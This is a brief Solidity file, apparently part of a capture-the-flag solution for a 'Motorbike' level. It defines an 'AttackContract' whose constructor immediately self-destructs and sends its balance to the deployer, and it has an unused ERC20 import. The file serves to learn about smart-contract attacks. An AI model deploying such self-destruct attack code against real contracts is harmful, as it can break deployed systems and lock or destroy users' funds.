// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// ================================================================
// │                       LEVEL 25 - MOTORBIKE                   │
// ================================================================
contract AttackContract {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}
